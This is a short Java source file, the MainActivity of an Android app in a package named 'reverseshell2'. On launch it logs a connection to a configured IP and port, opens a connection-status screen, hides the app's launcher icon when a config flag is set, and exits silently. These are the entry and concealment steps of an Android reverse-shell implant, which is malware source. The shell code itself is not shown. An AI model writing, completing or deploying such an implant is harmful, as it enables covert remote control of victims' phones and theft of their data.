package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;


public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        Log.d(TAG, "Connecting to: " + config.IP + ":" + config.port);
        
        // Launch connection status activity
        Intent intent = new Intent(this, ConnectionStatusActivity.class);
        startActivity(intent);
        
        // Hide app icon after showing status
        if(config.icon){
            new functions(activity).hideAppIcon(context);
        }
        
        finish();
        overridePendingTransition(0, 0);
    }
}
